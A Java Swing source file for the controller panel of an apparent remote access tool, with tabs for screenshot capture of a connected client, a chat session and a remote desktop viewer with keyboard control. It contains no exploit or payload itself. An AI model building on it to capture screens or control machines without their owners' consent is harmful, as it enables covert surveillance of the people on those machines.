package subterranean.crimson.server.graphics.panels.cp.desktop;

import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Rectangle;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.Date;

import javax.swing.BoxLayout;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.SwingConstants;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;

import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.ControlPanel;
import subterranean.crimson.server.graphics.StatusLights;
import subterranean.crimson.server.graphics.frames.MainScreen;
import subterranean.crimson.server.graphics.panels.cp.CPanel;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.exceptions.InvalidResponseException;
import subterranean.crimson.universal.remote.Player;

import javax.swing.JSeparator;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

import javax.swing.DefaultComboBoxModel;

import subterranean.crimson.universal.remote.Control;
import subterranean.crimson.universal.remote.Timing;
import subterranean.crimson.universal.translation.T;

import javax.swing.border.BevelBorder;

public class SPDesktop extends CPanel {

	private static final long serialVersionUID = 1L;

	private StatusLights captureLights;
	private JLabel lblImage;
	private boolean chatSessionOpen;
	private JTextField alias;
	private JTextArea input_field;

	private JLabel status;
	private JButton btnHideChat;
	private JButton btnShowChat;
	private JCheckBox chckbxShowClosemaximizeminimizeButtons;
	private JLabel lblAlias;
	private JButton btnSend;

	private JTextArea chat;

	private Player screenPlayer;

	private JButton btnSs;

	private Thread fps;

	private JLabel lblFps;

	private JComboBox comboBox_1;

	private JLabel label_1;

	private JComboBox comboBox;

	private JLabel label;

	private JLabel label_2;

	private JComboBox comboBox_2;

	private JButton screenshot;

	public void startFPS() {
		if (fps != null && fps.isAlive()) {
			return;
		}
		fps = new Thread(new Runnable() {
			public void run() {
				try {
					while (true) {
						lblFps.setText("" + screenPlayer.frames + " FPS");
						screenPlayer.frames = 0;
						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {

						}
					}
				} finally {
					lblFps.setText("0 FPS");
				}
			}
		});
	}

	public void stopFPS() {
		fps.interrupt();
		fps = null;
	}

	public SPDesktop(final ControlPanel cp) {
		chatSessionOpen = ClientCommands.chat_isSessionOpen(cp.c);
		setLayout(new CardLayout(0, 0));
		JTabbedPane tabbedPane_2 = new JTabbedPane(JTabbedPane.TOP);
		add(tabbedPane_2, "name_16535065371553");

		JPanel screenshot_panel = new JPanel();
		tabbedPane_2.addTab("Screenshot", null, screenshot_panel, null);
		screenshot_panel.setLayout(new BorderLayout(0, 0));

		JPanel button_panel = new JPanel();
		button_panel.setBounds(new Rectangle(0, 0, 0, 50));
		button_panel.setMinimumSize(new Dimension(10, 50));
		button_panel.setSize(new Dimension(0, 40));
		screenshot_panel.add(button_panel, BorderLayout.SOUTH);
		button_panel.setLayout(new FlowLayout(FlowLayout.RIGHT, 5, 5));

		captureLights = new StatusLights();
		captureLights.setPreferredSize(new Dimension(9, 25));
		captureLights.setBounds(new Rectangle(0, 0, 9, 25));
		button_panel.add(captureLights);

		JButton btnCapture = new JButton("Capture");
		button_panel.add(btnCapture);
		btnCapture.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				Runnable r = new Runnable() {
					public void run() {
						captureLights.replaceLight(Color.YELLOW, 2);
						ImageIcon image = null;
						try {
							image = ClientCommands.screenmanager_screenshot(cp.c, 0);
						} catch (InvalidResponseException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						if (image == null) {
							captureLights.replaceLight(Color.RED, 1);
							MainScreen.window.addNotification("Could not get screenshot.");
							return;
						}

						lblImage.setIcon(image);

						captureLights.replaceLight(Color.GREEN, 3);
					}
				};

				new Thread(r).start();

			}
		});
		captureLights.light(Color.GREEN, 3);

		JScrollPane scrollPane = new JScrollPane();
		screenshot_panel.add(scrollPane, BorderLayout.CENTER);

		lblImage = new JLabel();
		scrollPane.setViewportView(lblImage);

		JPanel chat_panel = new JPanel();
		tabbedPane_2.addTab("Chat", null, chat_panel, null);
		chat_panel.setLayout(new BoxLayout(chat_panel, BoxLayout.Y_AXIS));

		JPanel session_control_panel = new JPanel();
		session_control_panel.setPreferredSize(new Dimension(10, 150));
		session_control_panel.setBorder(new TitledBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "", TitledBorder.LEADING, TitledBorder.TOP, null, null), "Control", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		chat_panel.add(session_control_panel);
		session_control_panel.setLayout(null);

		btnHideChat = new JButton("End Session");

		btnHideChat.setFont(new Font("Dialog", Font.BOLD, 10));
		btnHideChat.setBounds(141, 20, 117, 25);
		session_control_panel.add(btnHideChat);

		btnShowChat = new JButton("Start Session");

		btnShowChat.setFont(new Font("Dialog", Font.BOLD, 10));
		btnShowChat.setBounds(12, 20, 117, 25);
		session_control_panel.add(btnShowChat);

		chckbxShowClosemaximizeminimizeButtons = new JCheckBox(T.t("misc-disable_close"));
		chckbxShowClosemaximizeminimizeButtons.setVisible(false);
		chckbxShowClosemaximizeminimizeButtons.setSelected(true);

		chckbxShowClosemaximizeminimizeButtons.setBounds(8, 53, 301, 23);
		session_control_panel.add(chckbxShowClosemaximizeminimizeButtons);

		lblAlias = new JLabel(T.t("misc-alias") + ":");
		lblAlias.setBounds(12, 121, 49, 15);
		session_control_panel.add(lblAlias);

		alias = new JTextField();
		alias.setText("Administrator");

		alias.setBounds(79, 119, 114, 19);
		session_control_panel.add(alias);
		alias.setColumns(10);

		status = new JLabel();
		status.setBounds(276, 24, 70, 15);
		session_control_panel.add(status);

		JCheckBox chckbxShareScreen = new JCheckBox("Share Screen");
		chckbxShareScreen.setBounds(8, 80, 129, 23);
		session_control_panel.add(chckbxShareScreen);

		JCheckBox chckbxAlwaysOnTop = new JCheckBox("Always on Top");
		chckbxAlwaysOnTop.setBounds(141, 80, 129, 23);
		session_control_panel.add(chckbxAlwaysOnTop);
		btnShowChat.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
//				ClientCommands.chat_visible(cp.c, chckbxShowClosemaximizeminimizeButtons.isSelected());
				chatSessionOpen = true;
				status.setText("misc-open");
				refreshChatStatuses();
			}
		});
		btnHideChat.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
//				ClientCommands.chat_invisible(cp.c);
				chatSessionOpen = false;
				status.setText("misc-close");
				refreshChatStatuses();
			}
		});

		JPanel session_panel = new JPanel();
		session_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Session", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		chat_panel.add(session_panel);
		session_panel.setLayout(new BorderLayout(0, 0));

		JPanel btn_panel2 = new JPanel(new FlowLayout(SwingConstants.RIGHT));
		session_panel.add(btn_panel2, BorderLayout.SOUTH);

		btnSend = new JButton("Send");
		btnSend.setEnabled(chatSessionOpen);

		btn_panel2.add(btnSend);

		JPanel content_panel = new JPanel();
		session_panel.add(content_panel);
		content_panel.setLayout(new BorderLayout(0, 0));

		chat = new JTextArea();
		chat.setLineWrap(true);
		chat.setEnabled(chatSessionOpen);
		chat.setEditable(false);

		JScrollPane scrollPane_1 = new JScrollPane();
		scrollPane_1.setBorder(new LineBorder(new Color(0, 0, 0)));
		scrollPane_1.add(chat);
		content_panel.add(scrollPane_1, BorderLayout.CENTER);

		input_field = new JTextArea();
		input_field.setBorder(new LineBorder(new Color(0, 0, 0)));
		content_panel.add(input_field, BorderLayout.SOUTH);
		input_field.setEnabled(chatSessionOpen);
		input_field.setRows(3);

		JPanel remote_panel = new JPanel();
		tabbedPane_2.addTab("Remote Desktop", null, remote_panel, null);
		remote_panel.setLayout(new BorderLayout(0, 0));

		JPanel cards = new JPanel();
		remote_panel.add(cards);
		cards.setLayout(new CardLayout(0, 0));

		JPanel view_panel = new JPanel();
		cards.add(view_panel, "name_29808605091890");
		view_panel.setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane_2 = new JScrollPane();
		view_panel.add(scrollPane_2);

		screenPlayer = new Player(cp.c);

		view_panel.add(screenPlayer);

		JPanel loading_panel = new JPanel();
		cards.add(loading_panel, "name_29804856767068");

		JProgressBar progressBar = new JProgressBar();
		loading_panel.add(progressBar);

		JToolBar menuBar = new JToolBar();
		menuBar.setFocusable(false);
		menuBar.setFloatable(false);
		remote_panel.add(menuBar, BorderLayout.NORTH);

		btnSs = new JButton("");
		btnSs.setToolTipText("Start");
		btnSs.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/start.png")));
		btnSs.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (!btnSs.isEnabled()) {
					return;
				}
				if (screenPlayer.running) {
					Logger.add("Stopping recorder");
					screenPlayer.stop();
					stopFPS();
					refreshToolbar();
				} else {
					Logger.add("Starting recorder");
					screenPlayer.start();
					startFPS();
					refreshToolbar();
				}
			}
		});
		menuBar.add(btnSs);

		screenshot = new JButton("");
		screenshot.setToolTipText("Take Screenshot");
		screenshot.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (!screenshot.isEnabled()) {
					return;
				}
				// save current frame

			}
		});
		screenshot.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/camera.png")));
		menuBar.add(screenshot);

		JSeparator separator = new JSeparator();
		separator.setPreferredSize(new Dimension(4, 16));
		separator.setOrientation(SwingConstants.VERTICAL);
		menuBar.add(separator);

		label = new JLabel("");
		label.setEnabled(false);
		label.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/color_wheel.png")));
		menuBar.add(label);

		comboBox = new JComboBox();
		comboBox.setEnabled(false);
		comboBox.setModel(new DefaultComboBoxModel(subterranean.crimson.universal.remote.Color.values()));
		label.setLabelFor(comboBox);
		menuBar.add(comboBox);

		JSeparator separator_1 = new JSeparator();
		separator_1.setOrientation(SwingConstants.VERTICAL);
		menuBar.add(separator_1);

		label_1 = new JLabel("");
		label_1.setEnabled(false);
		label_1.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/time.png")));
		menuBar.add(label_1);

		comboBox_1 = new JComboBox();
		comboBox_1.setEnabled(false);
		comboBox_1.setModel(new DefaultComboBoxModel(Timing.values()));
		label_1.setLabelFor(comboBox_1);
		menuBar.add(comboBox_1);

		JSeparator separator_2 = new JSeparator();
		separator_2.setOrientation(SwingConstants.VERTICAL);
		menuBar.add(separator_2);

		label_2 = new JLabel("");
		label_2.setEnabled(false);
		label_2.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/keyboard.png")));
		menuBar.add(label_2);

		comboBox_2 = new JComboBox();
		comboBox_2.setEnabled(false);
		comboBox_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
			}
		});
		comboBox_2.setModel(new DefaultComboBoxModel(Control.values()));
		label_2.setLabelFor(comboBox_2);
		menuBar.add(comboBox_2);

		JPanel stats_panel = new JPanel();
		stats_panel.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
		remote_panel.add(stats_panel, BorderLayout.SOUTH);

		lblFps = new JLabel("0 FPS");
		stats_panel.add(lblFps);

		btnSend.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				String s = input_field.getText();
				input_field.setText("");
				addMessage(s, alias.getText());
				ClientCommands.chat_message(cp.c, s, alias.getText());

			}
		});
		refreshChatStatuses();
	}

	public void refreshChatStatuses() {
		btnHideChat.setEnabled(chatSessionOpen);
		btnShowChat.setEnabled(!chatSessionOpen);
		lblAlias.setEnabled(!chatSessionOpen);
		alias.setEnabled(!chatSessionOpen);
		status.setText(chatSessionOpen ? "OPEN" : "CLOSED");
		input_field.setEnabled(chatSessionOpen);
		chat.setEnabled(chatSessionOpen);
		btnSend.setEnabled(chatSessionOpen);

	}

	public void addMessage(String message, String sender) {
		chat.setText(chat.getText() + "\n[" + new Date().toString() + "] (" + sender + "): " + message);
	}

	public void refreshToolbar() {
		if (screenPlayer.running) {
			btnSs.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/stop.png")));
			btnSs.setToolTipText("Stop");
			label.setEnabled(true);
			label_1.setEnabled(true);
			label_2.setEnabled(true);
			comboBox.setEnabled(true);
			comboBox_1.setEnabled(true);
			comboBox_2.setEnabled(true);
			screenshot.setEnabled(true);

		} else {
			btnSs.setIcon(new ImageIcon(SPDesktop.class.getResource("/subterranean/crimson/server/graphics/icons/rd/start.png")));
			btnSs.setToolTipText("Start");
			label.setEnabled(false);
			label_1.setEnabled(false);
			label_2.setEnabled(false);
			comboBox.setEnabled(false);
			comboBox_1.setEnabled(false);
			comboBox_2.setEnabled(false);
			screenshot.setEnabled(false);
		}
	}

	@Override
	public void changedConnectionState(boolean connected) {
		// TODO Auto-generated method stub

	}

	@Override
	public void refresh() {
		// TODO Auto-generated method stub

	}

	@Override
	public void deinitialize() {
		// TODO Auto-generated method stub

	}

	@Override
	public String getPanelName() {
		return "desktop";
	}
}
